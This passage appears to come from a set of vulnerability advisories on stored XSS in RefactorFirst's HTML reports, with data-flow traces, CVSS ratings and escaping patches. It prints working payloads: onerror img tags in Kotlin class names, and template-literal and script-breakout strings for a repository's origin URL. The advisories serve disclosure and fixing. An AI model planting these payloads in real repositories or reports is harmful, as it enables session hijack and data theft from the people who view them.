two classes named with backtick identifiers that embed the payload and reference each other's type in a method
parameter: class `A <img src=x onerror=alert(document.domain)>` { fun f (b:
`B <img src=x onerror=alert(document.domain)>`) {} } and the mirror-image class B — a legal 2-class dependency cycle;
the payload then renders raw in the cycle-summary table cell of every report and, when the cycle is the largest
(attacker-inflatable via ring size), in the 'Largest Class Cycle' <h2> heading. For the secondary sink, backtick method
names (fun `x <img src=x onerror=alert(1)>`() {}) whose bodies are copy-pasted between two classes produce the payload
inside the Duplicate Partners cell. Payload constraints (dynamically verified at commit 65d3bef with rewrite-kotlin
8.90.4): the identifier must avoid backtick/newline (Kotlin grammar), '/' (rewrite-kotlin's ClassId-to-JavaType-FQN
conversion rewrites '/' to '.' and detaches the class from its declared package, so removeClassesNotInCodebase drops the
vertex — a `<script>alert(1)</script>`-shaped class name therefore never reaches any report, verified end-to-end: zero
occurrences, 'has no Cycles or Disharmonies'), '.' (getClassName ()'s last-dot split truncates the rendered name), and
'?' (the same FQN conversion strips '?' bytes verbatim — the delivered payload loses exactly its '?' characters). None
of these bound attacker capability: full exfiltration logic is expressible with bracket notation,
String.fromCharCode-built URLs and fetch chains — a payload carrying a same-origin authenticated ride-along fetch plus a
cross-origin beacon executed from the cycle-summary cell (all constraints respected).

## Data flow

### Step 1 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/KotlinSourceFileGraphBuilder.java:52-116`

buildGraph creates rewrite-kotlin's KotlinParser (rewrite-kotlin 8.90.4, pinned via rewrite-bom 8.90.4 in
codebase-graph-builder/pom.xml:19-23), walks the whole project directory for *.kt/*.kts (only the configured test
directory is excluded; excludeTests defaults to true, testSourceDirectory defaults to src/test) and parses each file —
KotlinParser.parse runs the full Kotlin FIR frontend (buildFirFromKtFiles + AnalyseKt.runResolution) on every parse, so
type attribution is always attempted; even ParseError partial trees are subsequently visited (:92-104).

### Step 2 —

`dependency: org/openrewrite/kotlin/internal/KotlinTreeParserVisitor.java:3833-3851 (rewrite-kotlin 8.90.4)`

createIdentifier takes the raw PSI token text of a declaration name — for a backticked identifier that text includes the
backticks — and, when it starts with a backtick, strips exactly the first and last character and stores the inner text
verbatim as the J.Identifier simple name (marking it Quoted for re-printing). So 'class `A <img src=x onerror=alert(1)>`
' yields J.ClassDeclaration.getSimpleName () == 'A <img src=x onerror=alert(1)>'.

### Step 3 —

`dependency: org/jetbrains/kotlin/name/Name.java:61-63 and org/jetbrains/kotlin/psi/psiUtil/ClassIdCalculator.kt (kotlin-compiler-embeddable 2.4.10, pinned by rewrite-kotlin)`

The FIR name chain applies no character validation: KtNamedDeclarationStub.getName () returns
KtPsiUtil.unquoteIdentifier (text) (backticks stripped); Name.identifier (String) is a bare constructor — the
isValidIdentifier check that rejects leading '<' exists but is never invoked on this path; ClassIdCalculator builds the
ClassId via FqName.fromSegments (names) = names.joinToString (".") with no validation. The class symbol for the
payload-named class is created normally by FIR resolution.

### Step 4 —

`dependency: org/openrewrite/kotlin/KotlinTypeSignatureBuilder.kt:712-731 and org/openrewrite/kotlin/KotlinTypeMapping.kt:396-455 (rewrite-kotlin 8.90.4)`

convertClassIdToFqn (classId) → convertKotlinFqToJavaFq applies only '.'→'$', '/'→'.' and '?'-stripping; spaces, '<', '>
', '=' and quotes pass through untouched. KotlinTypeMapping.classType hands the resulting string to
typeFactory.computeClass (fqn, …), and JavaTypeFactory stores it verbatim: JavaType.Class.fullyQualifiedName ==
'p1.A <img src=x onerror=alert(1)>'.

### Step 5 — `codebase-graph-builder/src/main/java/org/hjug/graphbuilder/visitor/KotlinDependencyVisitor.java:99-118`

visitCompilationUnit registers every top-level Kotlin class as a class-graph vertex: attributed branch uses
type.getFullyQualifiedName () (payload FQN from step 4); un-attributed fallback (:106-118) builds pkg + '.' +
jcd.getSimpleName () (raw payload from step 2) — no identifier validation on either path, in contrast to the Java
visitor's fallback (UnattributedTypeFqnResolver.resolve:84) which rejects non-[A-Za-z_$][A-Za-z0-9_$]* names.
registerClassVertex and addClassDependency (GraphDependencyCollector) perform no name filtering; the payload class
survives finalizeDto's removeClassesNotInCodebase because its derived package 'p1' is a declared package.

### Step 6 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/CycleRanker.java:77-86`

identifyRankedCycles detects cycles with JGraphT's CycleDetector and creates RankedCycle (vertex, subGraph.vertexSet
(), …) — the cycle name is the representative cycle vertex's FQN, i.e. 'p1.A <img src=x onerror=alert(1)>' when both
members of the 2-class cycle carry the payload name (dedup keeps one entry per cycle). Cycle edges come from the payload
FQNs themselves via DependencyVisitorLogic.handleVariableDeclarations/handleMethodDeclaration →
BaseTypeProcessor.processType → TypeDependencyExtractor (no filtering).

### Step 7 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:773-781 and 875-881`

getRankedCycleSummaryData returns getClassName (rankedCycle.getCycleName ()) — substring-after-last-dot only, so the
payload segment survives — and renderClassCycleSummary feeds it to drawTableCell, which emits '<td align="left">' +
rowData + '</td>' with zero escaping. Rendered whenever any class cycle exists (analyzeCycles default true in CLI
ReportCommand.java:34-38 and both Mojos). HtmlReport extends SimpleHtmlReport, so every HTML entry point inherits the
sink.

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:792-795`

renderSingleCycle appends getClassName (cycle.getCycleName ()) raw into '<h2 align="center"><a id="CYCLEMAP">Largest
Class Cycle : …</a></h2>' — element-body position of the top-ranked cycle's heading; the injected <img src=x onerror=…>
is parsed as live markup and executes on page load with no interaction. No CSP exists anywhere in the generated HTML;
minifyHtml defaults to false and minify-html is a minifier, not a sanitizer.

### Step 9 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:1042-1048 and 1067-1069`

Secondary sinks: the method-signature cell escapes only '<'/'>' (MetricsVisitorLogic.buildMethodSignature:727
concatenates method.getSimpleName () raw, so backtick method names carry the payload), and the Duplicate Partners cell
renders DisharmonyDetector's partner string (sigA + ' ↔ ' + simpleB + '.' + sigB, :635) raw apart from a ';'-to-<br>
substitution — the same signature that is partially escaped in its own cell arrives unescaped here. renderPackageEdge (:
725-748) likewise renders package vertex names raw.

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java
b/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java @@ -772,7 +772,7 @@ private String[]
getRankedCycleSummaryData (RankedCycle rankedCycle) { return new String[] { // "Cycle Name", "Priority", "Class Count",
"Relationship Count"

-        getClassName(rankedCycle.getCycleName()),

+        escapeHtmlLabel(getClassName(rankedCycle.getCycleName())),
         rankedCycle.getPriority().toString(),
         String.valueOf(rankedCycle.getCycleNodes().size()),
         String.valueOf(rankedCycle.getEdgeSet().size())

@@ -790,7 +790,7 @@ stringBuilder .append ("<h2 align=\"center\"><a id=\"CYCLEMAP\">Largest Class Cycle : ")

-        .append(getClassName(cycle.getCycleName()))

+        .append(escapeHtmlLabel(getClassName(cycle.getCycleName())))
         .append("</a></h2>\n");

@@ -730,15 +730,15 @@ String startVertex = vertexes[0].trim (); String start; if (packagesToRemove.contains
(startVertex)) {

-        start = startVertex + "<strong>*</strong>";

+        start = escapeHtmlLabel(startVertex) + "<strong>*</strong>";
  } else {

-        start = startVertex;

+        start = escapeHtmlLabel(startVertex);
  }

  String endVertex = vertexes[1].trim (); String end; if (packagesToRemove.contains (endVertex)) {

-        end = endVertex + "<strong>*</strong>";

+        end = escapeHtmlLabel(endVertex) + "<strong>*</strong>";
  } else {

-        end = endVertex;

+        end = escapeHtmlLabel(endVertex);
  } @@ -1042,7 +1042,7 @@ }

-            sb.append(drawTableCell(sig != null ? sig.replace("<", "&lt;").replace(">", "&gt;") : ""));

+            sb.append(drawTableCell(sig != null ? escapeHtmlLabel(sig) : ""));

@@ -1065,7 +1065,8 @@ } sb.append (drawTableCell (

-                    rd.getDuplicationPartners() != null ? duplicationPartners.replace(";", "<br>") : ""));

+                    rd.getDuplicationPartners() != null ? escapeHtmlLabel(duplicationPartners).replace(";", "<br>")
+                            : ""));

@@ -765,7 +765,8 @@ static String escapeHtmlLabel (String label) {

-        return label.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");

+        return label.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                .replace("\"", "&quot;").replace("'", "&#39;");
  }

## References

- https://cwe.mitre.org/data/definitions/79.html
- https://cwe.mitre.org/data/definitions/80.html
- https://owasp.org/www-community/attacks/xss/
- https://kotlinlang.org/docs/reference/grammar.html#escapedIdentifier

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [high] HtmlReport graph maps (class map + cycle maps: generateGraphButtons/buildClassGraphDot|buildClassCycleDot → hyperlinkClassForDot) embed git remote.origin.url raw inside a <script> template literal, enabling zero-interaction, zero-DOM-footprint stored XSS when a crafted repo's FULL HTML report (htmlReport goal / mvn site artifact) is opened — session-class impact only where the report is published to an authenticated web origin

- key: `BUG-R2-S2-A2-H2`
- disclosure: owner_only
- cwe: CWE-79
- file: `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`

# HtmlReport graph maps (class map + cycle maps: generateGraphButtons/buildClassGraphDot|buildClassCycleDot → hyperlinkClassForDot) embed git remote.origin.url raw inside a <script> template literal, enabling zero-interaction, zero-DOM-footprint stored XSS when a crafted repo's FULL HTML report (htmlReport goal / mvn site artifact) is opened — session-class impact only where the report is published to an authenticated web origin

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A2-H2
- **CWE:** CWE-79
- **CVSS:** 7.4 (`CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** downgraded
- **Affected versions:** 0.9.0 (latest release — verified dynamically: both DOT graph blocks carry the hostile
  remote.origin.url; 8 URL= vertex attributes per report) through the audited commit 65d3bef1 (0.10.0-SNAPSHOT); 0.8.0
  is not affected (0 URL= attributes anywhere in its report — the origin-URL source-link feature is absent). The sink
  exists only in the FULL HTML report: the htmlReport goal, the mvn site integration (RefactorFirstMavenReport,
  verified) and the CLI's HTML default (code path only — no released CLI jar 0.8.0/0.9.0 nor the audited commit can
  start: pre-existing picocli duplicate --output option). simpleHtmlReport emits no graph blocks (verified: 0 _dot
  blocks) and is therefore not a carrier.

## Exploitability rationale

Reachability R:L — the attacker must control the analyzed repository's `.git` (its
`config` supplies `remote.origin.url`): delivered as a repository archive that includes
`.git`, a clone from an attacker-operated remote, or a submodule whose URL comes from the attacker-authored
`.gitmodules`. Always requires the victim to fetch the repo, run a report goal, and open the emitted HTML — file-control
class, not unattended network reachability. Exposure E:D — the sink is on the default path of every entry point that
generates the FULL report (the Maven `htmlReport` goal — the README headline flow — and the `mvn site` integration,
which emits the same report string unescaped through mainSink.rawText; both verified dynamically, incl. released 0.9.0):
the class map renders even on the no-disharmony branch, and the `const <name>_dot` block is emitted unconditionally —
`dotGraphThreshold=4000` gates only the separate vizdom SVG image. No option enables or disables this sink. Two entry
points do NOT carry it: `simpleHtmlReport`
emits no graph blocks at all (measured: 0 `_dot` blocks — the README GitHub-Actions flow uses exactly this report type),
and the CLI cannot start in any tested version (pre-existing picocli bug). Certainty C:D — pure deterministic string
concatenation with no memory layout, race, or timing dependence; a hostile `remote.origin.url` reproduces the payload in
the output file every time, and the `const` initializer executes at page load without any click. Impact I:S —
browser-side JavaScript execution (template-literal
`${…}`/backtick breakout, or `</script>` HTML breakout — all zero-interaction), with the realistically achievable top
impact measured per consumption surface (EXP-R6-E2): on an authenticated web origin that publishes the report (the
Jenkins-HTML-Publisher / CI-artifact-viewer / internal-dashboard pattern) the payload acts as every viewer and
exfiltrates the origin's protected data with each viewer's session (proven; HttpOnly does not help); on the documented
default local `file://` view the impact is bounded to redirect/phishing plus report-content beacons (local-file reads
blocked by the browser, no cookie surface — proven); on the README step-summary CI flow the sink's artifact is not even
generated (simple report) and the surface sanitizes anyway. Not code execution in the I:X sense — the ceiling is session
hijack on hosting origins, conditional on a victim-side publishing step the tool does not perform.

## Code anchors

| File                                                                                          | Line | Function                    |
|-----------------------------------------------------------------------------------------------|-----:|-----------------------------|
| `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`                        |   85 | `getOriginUrl`              |
| `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`                        |   88 | `getRepoUrl`                |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    |  360 | `generateReport`            |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    |  369 | `generateReport`            |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                          |  512 | `generateGraphButtons`      |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                          |  564 | `buildClassGraphDot`        |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                          |  631 | `hyperlinkClassForDot`      |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                          |  923 | `renderClassCycleVisuals`   |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                          |  972 | `renderPackageGraphVisuals` |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                          |  391 | `printHead`                 |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                        |   14 | `writeReportToDisk`         |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java` |   60 | `execute`                   |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                 |   96 | `call`                      |

## Background

RefactorFirst is a developer/CI-side static-analysis tool (Maven plugin, CLI) that mines a project's git history with
JGit, ranks design "disharmonies" by change-proneness vs. effort, and emits an interactive HTML report
(`target/site/refactor-first-report.html`). The HTML report's Class Map / Cycle Map / Package Map sections render the
codebase's dependency graphs client-side: the Graphviz DOT text for each graph is embedded into the page inside a
JavaScript template literal, `const <graphName>_dot = ` + DOT + `;` within a plain `<script>` block, where
vizdom/graphlib/sigma consumers and 2D/3D popup buttons later pick it up. To let readers jump from a graph node to the
offending source file, every node carries a DOT `URL="<repoUrl><path>"` attribute whose prefix is the analyzed
repository's git remote: `remote.origin.url` is read from the repository's `.git/config`
by JGit. That remote URL is a free-form config string, not part of the content hosted on a code platform — but it *is*
part of what an attacker controls whenever the analyzed project originates from the attacker (a repository archive
including `.git`, a clone from an attacker-operated remote, or a submodule whose URL comes from the attacker-authored
`.gitmodules`). Analyzing third-party code is the tool's advertised primary use case, which puts this input on the
tool's main untrusted input channel.

## Description

`GitLogReader.getOriginUrl()` returns the raw INI value of `remote.origin.url`
(JGit `Config.getString`, no validation). `getRepoUrl()` applies only three cosmetic transforms — a `git@`→`https://`
rewrite (only when the string starts with `git@`), a global `.git` substring removal, and a
`/blob|/-/blob|/src/<commit-hash>/` suffix append. None of these touches backtick, `${`, `"`, `<`, `>` or `/`, and no
scheme allow-list, character-set validation, percent-encoding, or escaping exists anywhere on the path. The string is
passed unchanged into `HtmlReport`'s graph renderers, where
`hyperlinkClassForDot()` emits `URL="<repoUrl><path>"` per graph vertex (the `path`
half is percent-encoded via `Path.toUri()`, so it cannot supply breakout characters —
`repoUrl` is the only raw component). The DOT text is then wrapped as a JavaScript template literal by
`buildClassGraphDot`/`buildClassCycleDot`/`buildPackageGraphDot`
(`dot.append("`strict digraph G {\n")` … `dot.append ("}`;")`) and emitted by
`generateGraphButtons()` as:

    <script>
    const <graphName>_dot = `strict digraph G { … URL="<repoUrl><path>" … }`;
    </script>

This is a classic (non-module, dependency-free) script block: the `const` initializer executes at page load, with no
click and no CDN dependency. Three independent breakout classes make `remote.origin.url` execute attacker-controlled
code:

1. **`${…}` interpolation** — an origin URL of `https://evil/x${<payload>}y` becomes a live substitution expression when
   the template literal is evaluated during the
   `const` initialization; the surrounding statement stays syntactically valid, so the whole script parses and the
   payload runs (arbitrary expression: cookie read/exfil,
   `fetch`, DOM manipulation).
2. **Backtick breakout** — `https://evil/x` + backtick + `+<payload>+` + backtick + `y`
   closes the literal and turns the payload into an operand of string concatenation — still a valid expression, executed
   during initializer evaluation.
3. **`</script>` HTML breakout** — an origin URL containing `</script><img src=x
   onerror=…>` terminates the `<script>` element at HTML parse time (the script-data state is not JS-string aware); the
   injected element becomes live markup and its handler fires at page load. The truncated script content is a harmless
   JS parse error.

All graph sections emit their own `const <name>_dot` block unconditionally — the class map (rendered even on the
no-disharmony branch of `generateReport`), every cycle map, and the package map — and the `dotGraphThreshold=4000` check
gates only the separate vizdom SVG image (`generateDotImage`), never the template-literal block. The payload itself is
carried by the class map and the cycle maps (both via `hyperlinkClassForDot`'s `URL="…"` vertex attributes); the package
map's DOT vertices carry no `URL=` attribute at all (`renderPackageVertices`), so `remote.origin.url` never lands inside
`packageGraph_dot`
(POC-verified with a cross-package fixture whose Package Map section renders: 0 payload hits in `packageGraph_dot` while
the class-map/cycle blocks carry the payload). Preconditions are fully attacker-forceable: a git repo with ≥1 commit and
a set
`remote.origin.url` (attacker-authored), plus ≥1 class-relationship edge so that at least one vertex with a source-file
mapping renders (two classes where one references the other suffice; every parsed class is registered in
`classToSourceFilePathMapping`).

No defense exists downstream: `escapeHtmlLabel` is applied only to class-name table labels and never to the URL; the
DOT-level `\$` replaces apply to class-name labels only and escape DOT syntax, not JS; the report has no
Content-Security-Policy meta tag (`printHead` emits only CDN script/link tags) while loading ~8 CDN scripts, so inline
script execution is fully enabled; `ReportWriter.writeReportToDisk` writes the HTML verbatim; and the optional
`minifyHtml` post-pass is off by default in both entry points and is a semantics-preserving minifier, not an escaper
(string/template-literal content survives it). GitHub's step-summary surface does sanitize pasted HTML (and the README's
CI flow produces the `simpleHtmlReport` artifact, which contains no graph blocks at all — this sink's artifact never
reaches that surface through the documented flow), but the primary documented flow (opening the local report file,
README: "View the report at target/site/refactor-first-report.html") and any web-hosted full report (the project's own
rawcdn.githack.com sample reports, CI artifacts, internal dashboards, published `mvn site` output) are unsanitized.

POC verification (poc/poc.md, sandbox): all three breakout classes reproduced end-to-end through the documented
`htmlReport` Maven goal on fixture family F1 (hostile
`remote.origin.url`): the `${}` and backtick payloads fire one alert per rendered graph vertex at page load in jsdom and
real Chrome (8 executions on a 10-class fixture; the evaluated const shows the payload's return value interpolated,
proving execution); the
`</script>` payload truncates both graph script elements at `URL="` (Chrome reports
`SyntaxError: Unexpected end of input`), leaves the consts unassigned, and turns the payload into live markup — 28
`img[onerror]` elements firing 28 zero-interaction dialogs in real Chrome on a plain file:// open (and the same count on
a loopback-hosted http:// origin, where the payload reads `document.domain`). A benign-URL control fixture produces a
clean report with zero alerts/dialogs/injected markup. The no-disharmony branch ("Congratulations…" report) still
carries the payload in `classGraph_dot` and executes it.

Relationship to sibling finding: this is the same root cause (unvalidated
`remote.origin.url` reaching report sinks) as BUG-R2-S2-A1-H1, whose report documents this DOT sink as its "Sink 4"; the
present finding carries the JS/DOT-sink chain (ADV-R2-S2-A2) with the full template-literal analysis. The two should
share one POC harness (one malicious repo exercises A1's `href` sinks and this DOT sink simultaneously); consolidation
is routed to decide. Real-scenario impact was assessed separately for each (exp/ of each finding): the impact ceiling is
identical (session-class on authenticated hosting origins, conditional; bounded on the local view; nothing on the
step-summary surface), so both are calibrated to CVSS 7.4 / EV 7 / P1 / I:S; the differentiators are coverage (this
sink: full report + site artifact only, the sibling: both report types incl. empty repos) and payload profile (this
sink: unconstrained JS grammar with zero DOM footprint; the sibling: unquoted- attribute grammar with injected
elements). A sink-isolated `${…}` payload proved this finding independently sufficient for the full impact class
(exp/exp.md, EXP-R6-E2).

## Attack

The attacker is the provider of the codebase being analyzed. Delivery paths that put a hostile `remote.origin.url` into
the victim's `.git/config`: (1) distribute the project as an archive that includes a pre-built `.git` directory (vendor
drop, file share, email attachment) — `.git/config` is a plain attacker-authored file with no git-client sanitization;
(2) induce the victim to clone from an attacker-operated remote whose URL string itself carries the payload (git stores
the clone URL verbatim; the attacker controls the server's routing so the clone succeeds); (3) a superproject whose
tracked
`.gitmodules` supplies the submodule origin URL — after `git submodule update --init`
the submodule's `.git/modules/<name>/config` carries it verbatim, and JGit's
`findGitDir` follows the `.git` pointer file when the report is run inside the submodule directory. The victim then runs
the tool's normal workflow — `mvn
org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:htmlReport` (the README headline flow) or the `mvn site`
integration (both verified dynamically to emit and execute the sink; the CLI's HTML default is not a realistic vector —
no tested CLI jar can start, pre-existing picocli bug; `simpleHtmlReport` emits no graph blocks at all) — and opens the
generated report, which the tool itself advertises ("View the report at target/site/refactor-first-report.html"). The
attacker's JavaScript executes the moment the page loads, once per rendered graph vertex with a source-file mapping (8
sites on a 10-class fixture; scales with repo size), and for the `${…}`/backtick shapes with ZERO DOM footprint — no
injected elements, no attribute changes, no extra console errors, graphs keep rendering (measured vs a benign control) —
making this the stealthiest injection channel of the report family. What the payload achieves is set by which surface
renders the artifact (all measured, EXP-R6-E2): on the default local `file://` view — redirect/phishing in the trusted
report context plus report-content beacons to attacker infrastructure, with local-file reads blocked by the browser and
no cookie surface; on an authenticated web origin that publishes the report (the Jenkins-HTML-Publisher /
CI-artifact-viewer / internal-dashboard pattern for Maven HTML reports, incl. published `mvn site` artifacts) — full
session-class compromise: the payload's same-origin fetch rides every viewer's session (HttpOnly notwithstanding),
exfiltrates the origin's protected data plus non-HttpOnly cookies, and propagates to every viewer of the shared
artifact; on session-less web origins (raw-CDN hosting like the project's own rawcdn.githack.com sample) — arbitrary
rendering/redirect for every viewer plus direct viewer-IP/UA beacons; on the README step-summary CI flow — nothing: that
flow's simpleHtmlReport artifact contains no graph blocks, and the step-summary surface sanitizes script content anyway.
The attacker also fully controls the repository content, so the two cross-referencing classes that place a
`URL="<repoUrl>…"` attribute into the class-map DOT are guaranteed present, and the payload-carrying `const` block is
emitted regardless of graph size (the 4000-node threshold only gates the SVG image).

### Payload

The payload is a single line in the analyzed repository's `.git/config`:
`[remote "origin"] url = <payload>`. Working shapes (all avoid the `git@` prefix so the cosmetic rewrites leave them
intact; none contains `.git` or `gitlab`, so only the harmless `/blob/<hash>/` suffix is appended behind the payload):
(a) template-literal interpolation: `https://evil/x${alert(document.domain)}y` — the substitution executes when
`const classGraph_dot = …` is evaluated at page load; (b) backtick breakout: `https://evil/x` + `` ` `` +
`+alert(document.domain)+` + `` ` ``

+ `y` — payload becomes a concatenation operand, still executed at load; (c) script-block breakout: `https://evil/x</script><img src=x
onerror=alert(document.domain)>y` — the `</script>` sequence ends the script element at HTML parse time and the injected
  `<img onerror>` fires without any click. Shape (a)
  additionally requires nothing beyond two cross-referencing Java classes in the repo so that at least one graph vertex
  renders with its `URL="…"` attribute.

## Data flow

### Step 1 — `refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java:60-77`

Victim runs the htmlReport mojo on the analyzed project (baseDir = project basedir) — the entry point that generates the
FULL report carrying this sink; the mvn site integration (RefactorFirstMavenReport.java:71-86, output via
mainSink.rawText — unescaped, verified dynamically) renders the same code, and the CLI's HTML default would too but no
tested CLI jar can start (pre-existing picocli bug). The simpleHtmlReport goal funnels into SimpleHtmlReport, whose
graph-render overrides return empty strings — it emits no DOT blocks and is not a carrier of this sink (verified: 0 _dot
blocks in its artifact).

### Step 2 — `change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java:84-85`

getOriginUrl () returns gitRepository.getConfig ().getString ("remote", "origin", "url") — the raw, free-form
remote.origin.url value from the analyzed repository's .git/config (JGit returns it verbatim; no validation).

### Step 3 — `change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java:88-108`

getRepoUrl () applies only cosmetic transforms — git@→https:// rewrite (only for git@-prefixed strings), global .git
substring removal, /blob|/-/blob|/src/<hash>/ suffix append. Backtick, ${, ", <, >, / are untouched; no scheme
allow-list, no character validation, no encoding, no escaping.

### Step 4 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:360,417-421`

generateReport () obtains the raw repoUrl via getRepoUrl (projectBaseDir) and passes the unmodified string into
renderClassGraphVisuals (:369 no-disharmony branch, :381), renderPackageGraphVisuals (:390) and renderCycles (:410).

### Step 5 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:561-584,941-958,995-1016`

buildClassGraphDot/buildClassCycleDot/buildPackageGraphDot wrap the whole DOT text as a JavaScript template literal
expression: dot.append ("`strict digraph G {\n") (:564/:947/:998) … dot.append("}`;") (:582/:957/:1015).

### Step 6 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:623-631`

Sink — hyperlinkClassForDot () returns URL="<repoUrl><path>" target="_blank" per rendered vertex (call site :604 in
renderClassVertices): repoUrl is concatenated raw; the path half is Path.toUri () percent-encoded
(AbstractDependencyVisitor.java:78,98,107), so repoUrl is the only raw component inside the literal.

### Step 7 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:512-521,489,923,972`

generateGraphButtons () emits <script>\nconst <graphName>_dot = <dot>\n</script> — a classic, dependency-free script
block whose const initializer (the template literal) is evaluated at page load. The block is emitted unconditionally for
the class map (:489), cycle maps (:923) and package map (:972); the dotGraphThreshold=4000 checks (:502/:928/:985) gate
only the separate vizdom SVG image, never this block (POC-verified: all fixture graphs below threshold and rendered).
The repoUrl payload lands in the class-map and cycle-map blocks (hyperlinkClassForDot URL attributes); the package-map
block carries no URL attribute (renderPackageVertices) and is not a payload carrier (POC-verified). ${…} in repoUrl
executes as a substitution; a backtick closes the literal into a concatenation; a </script> sequence terminates the
script element at HTML parse time and the following markup executes as live HTML.

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:107-112`

Optional minifyHtml post-pass (default false in the Maven mojo field initializer and the CLI) — a semantics-preserving
minifier, not an escaper; string/template-literal content survives it.

### Step 9 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:14-42`

writeReportToDisk () writes the HTML verbatim to target/site/refactor-first-report.html; the report has no
Content-Security-Policy (HtmlReport.printHead :391-404 emits only CDN script/link tags), so the injected JavaScript
executes when the victim opens the file.

## Fix / patch notes

diff --git a/change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java
b/change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java ---
a/change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java +++
b/change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java @@ -95,6 +95,13 @@ public class GitLogReader
implements AutoCloseable { if (originUrl == null) { return ""; }

+        // Only well-formed web URLs may be embedded in generated reports as
+        // source-link prefixes; anything else (javascript:, data:, file:, ...)
+        // is rejected outright.
+        if (!originUrl.startsWith("https://") && !originUrl.startsWith("http://")) {
+            return "";
+        }

         repoUrl = originUrl.replace(".git", "");

@@ -105,6 +112,11 @@ public class GitLogReader implements AutoCloseable { } else { repoUrl = repoUrl + "/blob/" +
getCurrentCommitHash () + "/"; }

-        return repoUrl;

+        // Keep only RFC 3986 URL characters: drops every character that is
+        // markup- or JS-significant outside a URL (space, ", <, >, `, {, }, \),
+        // so the value cannot break out of a <script> block, a JS template
+        // literal, or an attribute value downstream (HtmlReport DOT embedding,
+        // report hrefs).
+        return repoUrl.replaceAll("[^A-Za-z0-9._~:/?#\\[\\]@!$&'()*+,;=%-]", "");
  }

## References

- https://cwe.mitre.org/data/definitions/79.html
- https://cwe.mitre.org/data/definitions/80.html
- https://cwe.mitre.org/data/definitions/20.html
- https://owasp.org/www-community/attacks/xss/
- https://html.spec.whatwg.org/multipage/parsing.html#script-data-state
- https://tc39.es/ecma262/multipage/ecmascript-language-lexical-grammar.html#sec-template-literals

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [high] HTML report cycle-map visuals (HtmlReport.renderClassCycleVisuals → generateGraphButtons/generateDotImage/popup generators) interpolate the raw class-cycle name into unquoted HTML attribute values, popup-button element bodies and script blocks of the FULL HTML report (CLI default -t HTML, Maven htmlReport goal, mvn site), enabling zero-interaction stored XSS via Kotlin backticked class names — session-class compromise of every viewer when the report is published to an authenticated web origin (the standard CI publishing pattern); the vulnerable Kotlin analysis is unreleased (no released version parses Kotlin sources)

- key: `BUG-R2-S2-A2-H5`
- disclosure: owner_only
- cwe: CWE-79
- file: `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/KotlinSourceFileGraphBuilder.java`

# HTML report cycle-map visuals (HtmlReport.renderClassCycleVisuals → generateGraphButtons/generateDotImage/popup generators) interpolate the raw class-cycle name into unquoted HTML attribute values, popup-button element bodies and script blocks of the FULL HTML report (CLI default -t HTML, Maven htmlReport goal, mvn site), enabling zero-interaction stored XSS via Kotlin backticked class names — session-class compromise of every viewer when the report is published to an authenticated web origin (the standard CI publishing pattern); the vulnerable Kotlin analysis is unreleased (no released version parses Kotlin sources)

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A2-H5
- **CWE:** CWE-79
- **CVSS:** 7.4 (`CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** confirmed
- **Affected versions:** confirmed and dynamically reproduced at 0.10.0-SNAPSHOT (commit 65d3bef) with rewrite-kotlin
  8.90.4 / kotlin-compiler-embeddable 2.4.10 (see poc/ and exp/); the cycle-map visual sinks predate the Kotlin analysis
  but are unreachable with markup-bearing cycle names on every released version (≤0.9.0 contain no Kotlin parsing at
